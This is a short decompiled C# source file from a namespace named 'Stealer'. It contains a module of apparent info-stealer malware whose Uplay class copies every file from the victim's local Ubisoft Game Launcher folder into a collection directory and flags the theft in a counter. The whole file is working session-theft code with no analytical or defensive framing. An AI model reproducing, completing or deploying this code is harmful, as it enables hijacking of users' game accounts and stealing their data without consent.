using System;
using System.IO;

namespace Stealer
{
	// Token: 0x02000013 RID: 19
	internal sealed class Uplay
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00004784 File Offset: 0x00002984
		public static bool GetUplaySession(string sSavePath)
		{
			if (!Directory.Exists(Uplay.path))
			{
				return false;
			}
			Directory.CreateDirectory(sSavePath);
			foreach (string sourceFileName in Directory.GetFiles(Uplay.path))
			{
				File.Copy(sourceFileName, Path.Combine(sSavePath, Path.GetFileName(sourceFileName)));
			}
			Counter.Uplay = true;
			return true;
		}

		// Token: 0x04000050 RID: 80
		private static string path = Path.Combine(Paths.lappdata, "Ubisoft Game Launcher");
	}
}
